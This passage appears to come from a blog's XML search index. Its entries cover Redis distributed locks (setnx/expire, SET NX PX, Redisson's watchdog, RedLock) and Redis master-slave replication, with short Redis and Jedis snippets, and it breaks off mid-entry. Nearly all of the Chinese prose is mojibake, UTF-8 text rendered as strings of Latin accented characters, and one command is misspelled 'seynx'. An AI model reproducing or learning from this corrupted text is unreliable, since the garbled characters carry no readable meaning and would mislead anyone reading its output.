alt="avatar"></p><p>æœ€åæŒ‰Escé”®é€€å‡ºinsertæ¨¡å¼,è¾“å…¥:wqä¿å­˜å¹¶é€€å‡º</p><p>ç„¶åå†æ‰§è¡Œä¸Šé¢çš„æ“ä½œå°±ä¸€åˆ‡æ­£å¸¸äº†</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisåˆ†å¸ƒå¼é”</title>
      <link href="/2023/11/13/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"/>
      <url>/2023/11/13/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Redisåˆ†å¸ƒå¼é”"><a href="#Redisåˆ†å¸ƒå¼é”" class="headerlink" title="Redisåˆ†å¸ƒå¼é”"></a>Redisåˆ†å¸ƒå¼é”</h2><hr><h4 id="åˆ†å¸ƒå¼é”çš„ç”±æ¥"><a href="#åˆ†å¸ƒå¼é”çš„ç”±æ¥" class="headerlink" title="åˆ†å¸ƒå¼é”çš„ç”±æ¥"></a>åˆ†å¸ƒå¼é”çš„ç”±æ¥</h4><p>åœ¨ä¼ ç»Ÿå•æœºéƒ¨ç½²çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨Javaå¹¶å‘å¤„ç†ç›¸å…³çš„API(å¦‚ReentrantLcokæˆ–synchronized)è¿›è¡Œäº’æ–¥æ§åˆ¶ã€‚</p><p>ä½†æ˜¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿåï¼Œç”±äºåˆ†å¸ƒå¼ç³»ç»Ÿå¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹å¹¶ä¸”åˆ†å¸ƒåœ¨ä¸åŒæœºå™¨ä¸Šï¼Œè¿™å°†ä½¿åŸå•æœºå¹¶å‘æ§åˆ¶é”ç­–ç•¥å¤±æ•ˆï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å°±éœ€è¦ä¸€ç§è·¨JVMçš„äº’æ–¥æœºåˆ¶æ¥æ§åˆ¶å…±äº«èµ„æºçš„è®¿é—®ï¼Œè¿™å°±æ˜¯åˆ†å¸ƒå¼é”çš„ç”±æ¥ã€‚</p><p>å½“å¤šä¸ªè¿›ç¨‹ä¸åœ¨åŒä¸€ä¸ªç³»ç»Ÿä¸­ï¼Œå°±éœ€è¦ç”¨åˆ†å¸ƒå¼é”æ§åˆ¶å¤šä¸ªè¿›ç¨‹å¯¹èµ„æºçš„è®¿é—®ã€‚æœ€å®é™…çš„åº”ç”¨åœºæ™¯åº”è¯¥æ˜¯æ§åˆ¶åº“å­˜ï¼Œæ¯”å¦‚è¯´ç”µå•†å¹³å°é˜²æ­¢å•†å“è¶…å–è¿™ç±»åœºæ™¯ã€‚</p><h4 id="åˆ†å¸ƒå¼é”éœ€è¦æ»¡è¶³çš„æ¡ä»¶"><a href="#åˆ†å¸ƒå¼é”éœ€è¦æ»¡è¶³çš„æ¡ä»¶" class="headerlink" title="åˆ†å¸ƒå¼é”éœ€è¦æ»¡è¶³çš„æ¡ä»¶"></a>åˆ†å¸ƒå¼é”éœ€è¦æ»¡è¶³çš„æ¡ä»¶</h4><ul><li><p><strong>äº’æ–¥æ€§</strong>ï¼šä»»æ„æ—¶åˆ»ï¼Œåªèƒ½æœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è·å–é”ï¼Œä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ªå®¢æˆ·ç«¯è·å–åˆ°é”ã€‚</p></li><li><p><strong>å®‰å…¨æ€§</strong>ï¼šé”åªèƒ½è¢«æŒæœ‰è¯¥é”çš„å®¢æˆ·ç«¯åˆ é™¤ï¼Œä¸èƒ½ç”±å…¶å®ƒå®¢æˆ·ç«¯åˆ é™¤ã€‚</p></li><li><p><strong>ä¸ä¼šæ­»é”</strong>ï¼šè·å–é”çš„å®¢æˆ·ç«¯å› ä¸ºæŸäº›åŸå› ï¼ˆå¦‚downæœºç­‰ï¼‰è€Œæœªèƒ½é‡Šæ”¾é”ï¼Œä¹Ÿèƒ½ä¿è¯åç»­å…¶ä»–å®¢æˆ·ç«¯èƒ½åŠ é”ã€‚</p></li><li><p><strong>å®¹é”™</strong>ï¼šåªè¦å¤§éƒ¨åˆ†çš„RedisèŠ‚ç‚¹æ­£å¸¸è¿è¡Œï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥åŠ é”å’Œè§£é”ã€‚</p></li></ul><h4 id="Redisåˆ†å¸ƒå¼é”å®ç°ä¸€-setnx-expire"><a href="#Redisåˆ†å¸ƒå¼é”å®ç°ä¸€-setnx-expire" class="headerlink" title="Redisåˆ†å¸ƒå¼é”å®ç°ä¸€(setnx+expire)"></a>Redisåˆ†å¸ƒå¼é”å®ç°ä¸€(setnx+expire)</h4><p>å®ç°å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seynx key value</span><br><span class="line">expire key time</span><br></pre></td></tr></table></figure><p>setnxå…¶å®å°±æ˜¯set if not existsçš„æ„æ€,ä»…å½“keyä¸å­˜åœ¨çš„æ—¶å€™æ‰èƒ½è¿›è¡Œæ’å…¥,æ‰§è¡Œå®Œæ“ä½œåå¯ä»¥å°†é”åˆ é™¤<br>expireå‘½ä»¤ä¸ºé”è®¾ç½®è¿‡æœŸæ—¶é—´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del key</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½é‡æ–°å¯¹keyçš„å€¼è¿›è¡Œæ“ä½œäº†</p><h4 id="Redisåˆ†å¸ƒå¼é”å®ç°äºŒ-set"><a href="#Redisåˆ†å¸ƒå¼é”å®ç°äºŒ-set" class="headerlink" title="Redisåˆ†å¸ƒå¼é”å®ç°äºŒ(set)"></a>Redisåˆ†å¸ƒå¼é”å®ç°äºŒ(set)</h4><p>ä¸Šé¢é‚£ç§å®ç°æ–¹å¼å­˜åœ¨ä¸€ç§é—®é¢˜,å¦‚æœåœ¨æ‰§è¡Œå®Œ setnx ä¹‹å,æ‰§è¡Œexpireä¹‹å‰,æœåŠ¡å™¨ crash æˆ–é‡å¯äº†å¯¼è‡´åŠ çš„è¿™ä¸ªé”æ²¡æœ‰è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå°±ä¼šå¯¼è‡´æ­»é”çš„æƒ…å†µï¼ˆåˆ«çš„çº¿ç¨‹å°±æ°¸è¿œè·å–ä¸åˆ°é”äº†ï¼‰</p><p>ä»£ç å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jedis.set(lockKey, requestId, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME, expireTime)</span><br></pre></td></tr></table></figure><p> <strong>ç¬¬ä¸€ä¸ªä¸º</strong>keyï¼Œæˆ‘ä»¬ä½¿ç”¨keyæ¥å½“é”ï¼Œå› ä¸ºkeyæ˜¯å”¯ä¸€çš„ã€‚</p><p><strong>ç¬¬äºŒä¸ª</strong>ä¸ºvalueï¼Œæˆ‘ä»¬ä¼ çš„æ˜¯requestIdï¼Œå¾ˆå¤šäººå¯èƒ½ä¸æ˜ç™½ï¼Œæœ‰keyä½œä¸ºé”ä¸å°±å¤Ÿäº†å—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç”¨åˆ°valueï¼ŸåŸå› å°±æ˜¯æˆ‘ä»¬åœ¨ä¸Šé¢è®²åˆ°åˆ†å¸ƒå¼é”è¦æ»¡è¶³çš„æ¡ä»¶æ—¶,æåˆ°çš„<strong>å®‰å…¨æ€§</strong>è¿™ä¸€æ¡ï¼Œé€šè¿‡ç»™valueèµ‹å€¼ä¸ºrequestIdï¼Œæˆ‘ä»¬å°±çŸ¥é“è¿™æŠŠé”æ˜¯å“ªä¸ªè¯·æ±‚åŠ çš„äº†ï¼Œåœ¨è§£é”çš„æ—¶å€™å°±å¯ä»¥æœ‰ä¾æ®ã€‚requestIdå¯ä»¥ä½¿ç”¨UUID.randomUUID().toString()æ–¹æ³•ç”Ÿæˆã€‚</p><p><strong>ç¬¬ä¸‰ä¸ª</strong>ä¸ºnxxxï¼Œè¿™ä¸ªå‚æ•°æˆ‘ä»¬å¡«çš„æ˜¯NXï¼Œæ„æ€æ˜¯SET IF NOT EXISTï¼Œå³å½“keyä¸å­˜åœ¨æ—¶ï¼Œæˆ‘ä»¬è¿›è¡Œsetæ“ä½œï¼›è‹¥keyå·²ç»å­˜åœ¨ï¼Œåˆ™ä¸åšä»»ä½•æ“ä½œï¼›</p><p><strong>ç¬¬å››ä¸ª</strong>ä¸ºexpxï¼Œè¿™ä¸ªå‚æ•°æˆ‘ä»¬ä¼ çš„æ˜¯PXï¼Œæ„æ€æ˜¯æˆ‘ä»¬è¦ç»™è¿™ä¸ªkeyåŠ ä¸€ä¸ªè¿‡æœŸçš„è®¾ç½®ï¼Œå…·ä½“æ—¶é—´ç”±ç¬¬äº”ä¸ªå‚æ•°å†³å®šã€‚</p><p><strong>ç¬¬äº”ä¸ª</strong>ä¸ºtimeï¼Œä¸ç¬¬å››ä¸ªå‚æ•°ç›¸å‘¼åº”ï¼Œä»£è¡¨keyçš„è¿‡æœŸæ—¶é—´ã€‚<br>æ€»çš„æ¥è¯´ï¼Œæ‰§è¡Œä¸Šé¢çš„set()æ–¹æ³•å°±åªä¼šå¯¼è‡´ä¸¤ç§ç»“æœï¼š1. å½“å‰æ²¡æœ‰é”ï¼ˆkeyä¸å­˜åœ¨ï¼‰ï¼Œé‚£ä¹ˆå°±è¿›è¡ŒåŠ é”æ“ä½œï¼Œå¹¶å¯¹é”è®¾ç½®ä¸ªæœ‰æ•ˆæœŸï¼ŒåŒæ—¶valueè¡¨ç¤ºåŠ é”çš„å®¢æˆ·ç«¯ã€‚2. å·²æœ‰é”å­˜åœ¨ï¼Œä¸åšä»»ä½•æ“ä½œã€‚</p><p>æˆ‘ä»¬çš„åŠ é”ä»£ç æ»¡è¶³æˆ‘ä»¬å¯é æ€§é‡Œæè¿°çš„ä¸‰ä¸ªæ¡ä»¶:</p><ul><li><strong>é¦–å…ˆ</strong>ï¼Œset()åŠ å…¥äº†NXå‚æ•°ï¼Œå¯ä»¥ä¿è¯å¦‚æœå·²æœ‰keyå­˜åœ¨ï¼Œåˆ™å‡½æ•°ä¸ä¼šè°ƒç”¨æˆåŠŸï¼Œä¹Ÿå°±æ˜¯åªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯èƒ½æŒæœ‰é”ï¼Œæ»¡è¶³<strong>äº’æ–¥æ€§</strong>ã€‚</li><li><strong>å…¶æ¬¡</strong>ï¼Œç”±äºæˆ‘ä»¬å¯¹é”è®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼Œå³ä½¿é”çš„æŒæœ‰è€…åç»­å‘ç”Ÿå´©æºƒè€Œæ²¡æœ‰è§£é”ï¼Œé”ä¹Ÿä¼šå› ä¸ºåˆ°äº†è¿‡æœŸæ—¶é—´è€Œè‡ªåŠ¨è§£é”ï¼ˆå³keyè¢«åˆ é™¤ï¼‰ï¼Œ<strong>ä¸ä¼šå‘ç”Ÿæ­»é”</strong>ã€‚</li><li><strong>æœ€å</strong>ï¼Œå› ä¸ºæˆ‘ä»¬å°†valueèµ‹å€¼ä¸ºrequestIdï¼Œä»£è¡¨åŠ é”çš„å®¢æˆ·ç«¯è¯·æ±‚æ ‡è¯†ï¼Œé‚£ä¹ˆåœ¨å®¢æˆ·ç«¯åœ¨è§£é”çš„æ—¶å€™å°±å¯ä»¥è¿›è¡Œæ ¡éªŒæ˜¯å¦æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯ã€‚<strong>è¿™æ ·å°±é¿å…äº†é”è¢«åˆ«çš„çº¿ç¨‹åˆ é™¤</strong>,ä¿è¯äº†<strong>å®‰å…¨æ€§</strong>ã€‚</li></ul><h4 id="Redisåˆ†å¸ƒå¼é”å®ç°ä¸‰-Redissionæ¡†æ¶"><a href="#Redisåˆ†å¸ƒå¼é”å®ç°ä¸‰-Redissionæ¡†æ¶" class="headerlink" title="Redisåˆ†å¸ƒå¼é”å®ç°ä¸‰(Redissionæ¡†æ¶)"></a>Redisåˆ†å¸ƒå¼é”å®ç°ä¸‰(Redissionæ¡†æ¶)</h4><p>æ–¹æ¡ˆäºŒè¿˜æ˜¯å¯èƒ½å­˜åœ¨<strong>é”è¿‡æœŸé‡Šæ”¾ï¼Œä¸šåŠ¡æ²¡æ‰§è¡Œå®Œ</strong>çš„é—®é¢˜ã€‚æœ‰äº›å°ä¼™ä¼´è®¤ä¸ºï¼Œç¨å¾®æŠŠé”è¿‡æœŸæ—¶é—´è®¾ç½®é•¿ä¸€äº›å°±å¯ä»¥å•¦ã€‚å…¶å®é—®é¢˜çš„å…³é”®å°±åœ¨äºæˆ‘ä»¬ä¸ç¡®å®šè¦è®¾ç½®å¤šé•¿æ—¶é—´,æ—¶é—´å¤ªçŸ­å°±ä¼šå¯¼è‡´é”è¿‡æœŸé‡Šæ”¾ï¼Œä¸šåŠ¡æ²¡æ‰§è¡Œå®Œ,æ—¶é—´å¤ªé•¿å°±ä¼šä½¿ç³»ç»Ÿè¿è¡Œæ•ˆç‡ä¸‹é™. æˆ‘ä»¬è®¾æƒ³ä¸€ä¸‹ï¼Œæ˜¯å¦å¯ä»¥ç»™è·å¾—é”çš„çº¿ç¨‹ï¼Œå¼€å¯ä¸€ä¸ªå®šæ—¶å®ˆæŠ¤çº¿ç¨‹ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´æ£€æŸ¥é”æ˜¯å¦è¿˜å­˜åœ¨ï¼Œå­˜åœ¨åˆ™å¯¹é”çš„è¿‡æœŸæ—¶é—´å»¶é•¿ï¼Œé˜²æ­¢é”è¿‡æœŸæå‰é‡Šæ”¾ã€‚Redissionæ¡†æ¶å¸®æˆ‘ä»¬å®ç°äº†æ­¤åŠŸèƒ½,åä¸º<strong>çœ‹é—¨ç‹—</strong></p><p><img src="https://pb01.s3.bitiful.net/7.png" alt="avatar"></p><p>åªè¦çº¿ç¨‹ä¸€åŠ é”æˆåŠŸï¼Œå°±ä¼šå¯åŠ¨ä¸€ä¸ªwatch dogçœ‹é—¨ç‹—ï¼Œå®ƒæ˜¯ä¸€ä¸ªåå°çº¿ç¨‹ï¼Œä¼šæ¯éš”10ç§’æ£€æŸ¥ä¸€ä¸‹ï¼Œå¦‚æœçº¿ç¨‹1è¿˜æŒæœ‰é”ï¼Œé‚£ä¹ˆå°±ä¼šä¸æ–­çš„å»¶é•¿é”keyçš„ç”Ÿå­˜æ—¶é—´ã€‚å› æ­¤ï¼ŒRedissonå°±æ˜¯ä½¿ç”¨Redissonè§£å†³äº†<strong>é”è¿‡æœŸé‡Šæ”¾ï¼Œä¸šåŠ¡æ²¡æ‰§è¡Œå®Œ</strong>é—®é¢˜ã€‚</p><p><img src="https://pb01.s3.bitiful.net/8.png" alt="avatar"></p><p>å¦‚æœçº¿ç¨‹ä¸€åœ¨Redisçš„masterèŠ‚ç‚¹ä¸Šæ‹¿åˆ°äº†é”ï¼Œä½†æ˜¯åŠ é”çš„keyè¿˜æ²¡åŒæ­¥åˆ°slaveèŠ‚ç‚¹ã€‚æ°å¥½è¿™æ—¶ï¼ŒmasterèŠ‚ç‚¹å‘ç”Ÿæ•…éšœï¼Œä¸€ä¸ªslaveèŠ‚ç‚¹å°±ä¼šå‡çº§ä¸ºmasterèŠ‚ç‚¹ã€‚çº¿ç¨‹äºŒå°±å¯ä»¥è·å–åŒä¸ªkeyçš„é”å•¦ï¼Œä½†çº¿ç¨‹ä¸€ä¹Ÿå·²ç»æ‹¿åˆ°é”äº†ï¼Œé”çš„å®‰å…¨æ€§å°±æ²¡äº†ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨RedLockï¼Œå®ƒçš„æ€è·¯æ˜¯ï¼Œåœ¨å¤šä¸ªRedisæœåŠ¡å™¨ä¸Šä¿å­˜é”ï¼Œåªéœ€è¦è¶…è¿‡åŠæ•°çš„RedisæœåŠ¡å™¨è·å–åˆ°é”ï¼Œé‚£ä¹ˆå°±çœŸçš„è·å–åˆ°é”äº†ï¼Œè¿™æ ·å°±ç®—æŒ‚æ‰ä¸€éƒ¨åˆ†èŠ‚ç‚¹ï¼Œä¹Ÿèƒ½ä¿è¯æ­£å¸¸è¿è¡Œï¼Œä¿è¯äº†<strong>å®¹é”™æ€§</strong>ã€‚</p><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ul><li><a href="https://www.cnblogs.com/wangyingshuo/p/14510524.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Rediså®ç°åˆ†å¸ƒå¼é”çš„7ç§æ–¹æ¡ˆï¼ŒåŠæ­£ç¡®ä½¿ç”¨å§¿åŠ¿ï¼</a></li><li>Redisç¬”è®° by itbaima</li><li><a href="https://developer.aliyun.com/article/307547" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Redis åˆ†å¸ƒå¼é”çš„æ­£ç¡®å®ç°æ–¹å¼ï¼ˆ Java ç‰ˆ ï¼‰</a></li><li><a href="https://www.runoob.com/redis/redis-tutorial.html" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">èœé¸Ÿæ•™ç¨‹|Redisæ•™ç¨‹</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redisä¸åˆ†å¸ƒå¼</title>
      <link href="/2023/11/13/redis%E4%B8%8E%E5%88%86%E5%B8%83%E5%BC%8F/"/>
      <url>/2023/11/13/redis%E4%B8%8E%E5%88%86%E5%B8%83%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="Redisä¸åˆ†å¸ƒå¼"><a href="#Redisä¸åˆ†å¸ƒå¼" class="headerlink" title="Redisä¸åˆ†å¸ƒå¼"></a>Redisä¸åˆ†å¸ƒå¼</h2><hr><h3 id="ä¸»ä»å¤åˆ¶"><a href="#ä¸»ä»å¤åˆ¶" class="headerlink" title="ä¸»ä»å¤åˆ¶"></a>ä¸»ä»å¤åˆ¶</h3><p><img src="https://pb01.s3.bitiful.net/4.png" alt="avatar"></p><h4 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h4><p>æœ‰å¤šä¸ªredisæœåŠ¡å™¨,åªæœ‰ä¸€ä¸ª<strong>ä¸»èŠ‚ç‚¹(Master)</strong>,å…¶ä½™å‡ä¸º<strong>ä»èŠ‚ç‚¹(Slave)</strong>,ä¸»èŠ‚ç‚¹å¯ä»¥è¿›è¡Œè¯»å†™æ“ä½œ,ä»èŠ‚ç‚¹åªèƒ½è¿›è¡Œè¯»æ“ä½œ.æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„,ä»èŠ‚ç‚¹ä¸­çš„å†…å®¹æ˜¯ç”±ä¸»èŠ‚ç‚¹ä¸­å¤åˆ¶è¿‡æ¥çš„(ç›´æ¥å¤åˆ¶/é—´æ¥å¤åˆ¶).</p><p>ä¸€ä¸ªä¸»èŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªä»èŠ‚ç‚¹(ä¹Ÿå¯ä»¥æ²¡æœ‰),ä¸€ä¸ªä»èŠ‚ç‚¹åªèƒ½æœ‰ä¸€ä¸ªä¸»èŠ‚ç‚¹.redisä¸»ä»å¤åˆ¶æ˜¯<code>å¼‚æ­¥å¤åˆ¶</code>,ä¸»èŠ‚ç‚¹æ”¶åˆ°å†™å‘½ä»¤,å…ˆå†™åˆ°å†…éƒ¨ç¼“å†²åŒº,ç„¶åå¼‚æ­¥å‘é€ç»™ä»èŠ‚ç‚¹.</p><h4 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»èŠ‚ç‚¹ä¿¡æ¯ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof ä¸»èŠ‚ç‚¹IP ä¸»èŠ‚ç‚¹ç«¯å£</span><br></pre></td></tr></table></figure></p><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><ul><li><strong>æ•°æ®å†—ä½™</strong>ï¼šä¸»ä»å¤åˆ¶å®ç°äº†æ•°æ®çš„çƒ­å¤‡ä»½ï¼Œæ˜¯æŒä¹…åŒ–ä¹‹å¤–çš„ä¸€ç§æ•°æ®å†—ä½™æ–¹å¼ã€‚</li><li><strong>æ•…éšœæ¢å¤</strong>ï¼šå½“ä¸»èŠ‚ç‚¹å‡ºç°é—®é¢˜æ—¶ï¼Œå¯ä»¥ç”±ä»èŠ‚ç‚¹æä¾›æœåŠ¡ï¼Œå®ç°å¿«é€Ÿçš„æ•…éšœæ¢å¤ï¼›å®é™…ä¸Šæ˜¯ä¸€ç§æœåŠ¡çš„å†—ä½™ã€‚</li><li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šåœ¨ä¸»ä»å¤åˆ¶çš„åŸºç¡€ä¸Šï¼Œé…åˆè¯»å†™åˆ†ç¦»ï¼Œå¯ä»¥ç”±ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œç”±ä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼ˆå³å†™Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯»Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä»èŠ‚ç‚¹ï¼‰ï¼Œåˆ†æ‹…æœåŠ¡å™¨è´Ÿè½½ï¼›å°¤å…¶æ˜¯åœ¨å†™å°‘è¯»å¤šçš„åœºæ™¯ä¸‹ï¼Œé€šè¿‡å¤šä¸ªä»èŠ‚ç‚¹åˆ†æ‹…è¯»è´Ÿè½½ï¼Œå¯ä»¥å¤§å¤§æé«˜RedisæœåŠ¡å™¨çš„å¹¶å‘é‡ã€‚</li><li><strong>é«˜å¯ç”¨åŸºçŸ³</strong>ï¼šé™¤äº†ä¸Šè¿°ä½œç”¨ä»¥å¤–ï¼Œä¸»ä»å¤åˆ¶è¿˜æ˜¯å“¨å…µå’Œé›†ç¾¤èƒ½å¤Ÿå®æ–½çš„åŸºç¡€ï¼Œå› æ­¤è¯´ä¸»ä»å¤åˆ¶æ˜¯Redisé«˜å¯ç”¨çš„åŸºç¡€ã€‚</li></ul><h4 id="Redisä¸ºä»€ä¹ˆéœ€è¦ä¸»ä»å¤åˆ¶"><a href="#Redisä¸ºä»€ä¹ˆéœ€è¦ä¸»ä»å¤åˆ¶" class="headerlink" title="Redisä¸ºä»€ä¹ˆéœ€è¦ä¸»ä»å¤åˆ¶"></a>Redisä¸ºä»€ä¹ˆéœ€è¦ä¸»ä»å¤åˆ¶</h4><p>ä½¿ç”¨Redisä¸»ä»å¤åˆ¶çš„åŸå› ä¸»è¦æ˜¯å•å°RedisèŠ‚ç‚¹å­˜åœ¨ä»¥ä¸‹çš„å±€é™æ€§ï¼š</p><ul><li><p>Redisè™½ç„¶è¯»å†™çš„é€Ÿåº¦éƒ½å¾ˆå¿«ï¼Œå•èŠ‚ç‚¹çš„Redisèƒ½å¤Ÿæ”¯æ’‘<strong>æ¯ç§’è¯·æ±‚æ•°(QPS)</strong>å¤§æ¦‚åœ¨5wå·¦å³ï¼Œå¦‚æœä¸Šåƒä¸‡çš„ç”¨æˆ·è®¿é—®ï¼ŒRediså°±æ‰¿è½½ä¸äº†ï¼Œæˆä¸ºäº†é«˜å¹¶å‘çš„ç“¶é¢ˆã€‚</p></li><li><p>å•èŠ‚ç‚¹çš„Redisä¸èƒ½ä¿è¯é«˜å¯ç”¨ï¼Œå½“Rediså› ä¸ºæŸäº›åŸå› æ„å¤–å®•æœºæ—¶ï¼Œä¼šå¯¼è‡´ç¼“å­˜ä¸å¯ç”¨</p></li><li><p>CPUçš„åˆ©ç”¨ç‡ä¸Šï¼Œå•å°Rediså®ä¾‹åªèƒ½åˆ©ç”¨å•ä¸ªæ ¸å¿ƒï¼Œè¿™å•ä¸ªæ ¸å¿ƒåœ¨é¢ä¸´æµ·é‡æ•°æ®çš„å­˜å–å’Œç®¡ç†å·¥ä½œæ—¶å‹åŠ›ä¼šéå¸¸å¤§ã€‚</p></li></ul><h4 id="ä¸»ä»å¤åˆ¶æµç¨‹"><a href="#ä¸»ä»å¤åˆ¶æµç¨‹" class="headerlink" title="ä¸»ä»å¤åˆ¶æµç¨‹"></a>ä¸»ä»å¤åˆ¶æµç¨‹</h4><p>ç¬¬ä¸€æ¬¡åŒæ­¥ä¸€èˆ¬æ˜¯<code>å…¨é‡åŒæ­¥</code>,åç»­åŸºäºå·²ç»å»ºç«‹çš„TCPé•¿è¿æ¥è¿›è¡Œ<code>å¢é‡åŒæ­¥</code>,å¦‚æœTCPé•¿è¿æ¥æ–­å¼€,å†æ¬¡è¿æ¥åè¿›è¡ŒåŒæ­¥,ä¸»èŠ‚ç‚¹ä¼šåˆ¤æ–­ä»èŠ‚ç‚¹è¦è¯»çš„æ•°æ®æ˜¯å¦åœ¨repl_backlog_bufferç¼“å†²åŒºä¸­,å¦‚æœåœ¨,åˆ™è¿›è¡Œå¢é‡åŒæ­¥,å¦åˆ™è¿›è¡Œå…¨é‡åŒæ­¥.</p><ol><li><p>è‹¥å¯åŠ¨ä¸€ä¸ªSlaveæœºå™¨è¿›ç¨‹ï¼Œåˆ™å®ƒä¼šå‘Masteræœºå™¨å‘é€ä¸€ä¸ªâ€œsync commandâ€å‘½ä»¤ï¼Œè¯·æ±‚åŒæ­¥è¿æ¥ã€‚</p></li><li><p>æ— è®ºæ˜¯ç¬¬ä¸€æ¬¡è¿æ¥è¿˜æ˜¯é‡æ–°è¿æ¥ï¼ŒMasteræœºå™¨éƒ½ä¼šå¯åŠ¨ä¸€ä¸ªåå°è¿›ç¨‹ï¼Œå°†æ•°æ®å¿«ç…§ä¿å­˜åˆ°æ•°æ®æ–‡ä»¶ä¸­ï¼ˆæ‰§è¡Œrdbæ“ä½œï¼‰ï¼ŒåŒæ—¶Masterè¿˜ä¼šè®°å½•ä¿®æ”¹æ•°æ®çš„æ‰€æœ‰å‘½ä»¤å¹¶ç¼“å­˜åœ¨æ•°æ®æ–‡ä»¶ä¸­ã€‚</p></li><li><p>åå°è¿›ç¨‹å®Œæˆç¼“å­˜æ“ä½œä¹‹åï¼ŒMasteæœºå™¨å°±ä¼šå‘Slaveæœºå™¨å‘é€æ•°æ®æ–‡ä»¶ï¼ŒSlaveç«¯æœºå™¨å°†æ•°æ®æ–‡ä»¶ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œç„¶åå°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ¥ç€Masteræœºå™¨å°±ä¼šå°†ä¿®æ”¹æ•°æ®çš„æ‰€æœ‰æ“ä½œä¸€å¹¶å‘é€ç»™Slaveç«¯æœºå™¨ã€‚è‹¥Slaveå‡ºç°æ•…éšœå¯¼è‡´å®•æœºï¼Œåˆ™æ¢å¤æ­£å¸¸åä¼šè‡ªåŠ¨é‡æ–°è¿æ¥ã€‚</p></li><li><p>Masteræœºå™¨æ”¶åˆ°Slaveç«¯æœºå™¨çš„è¿æ¥åï¼Œå°†å…¶å®Œæ•´çš„æ•°æ®æ–‡ä»¶å‘é€ç»™Slaveç«¯æœºå™¨ï¼Œå¦‚æœMateråŒæ—¶æ”¶åˆ°å¤šä¸ªSlaveå‘æ¥çš„åŒæ­¥è¯·æ±‚ï¼Œåˆ™Masterä¼šåœ¨åå°å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ä»¥ä¿å­˜æ•°æ®æ–‡ä»¶ï¼Œç„¶åå°†å…¶å‘é€ç»™æ‰€æœ‰çš„Slaveç«¯æœºå™¨ï¼Œç¡®ä¿æ‰€æœ‰çš„Slaveç«¯æœºå™¨éƒ½æ­£å¸¸ã€‚</p></li></ol><h4 id="ä¸»ä»æ•°æ®ä¸ä¸€è‡´"><a href="#ä¸»ä»æ•°æ®ä¸ä¸€è‡´" class="headerlink" title="ä¸»ä»æ•°æ®ä¸ä¸€è‡´"></a>ä¸»ä»æ•°æ®ä¸ä¸€è‡´</h4><p><strong>åŸå› </strong>: ä¸»ä»èŠ‚ç‚¹çš„å‘½ä»¤å¤åˆ¶æ˜¯<code>å¼‚æ­¥</code>æ‰§è¡Œçš„.åœ¨ä¸»ä»èŠ‚ç‚¹å‘½ä»¤ä¼ 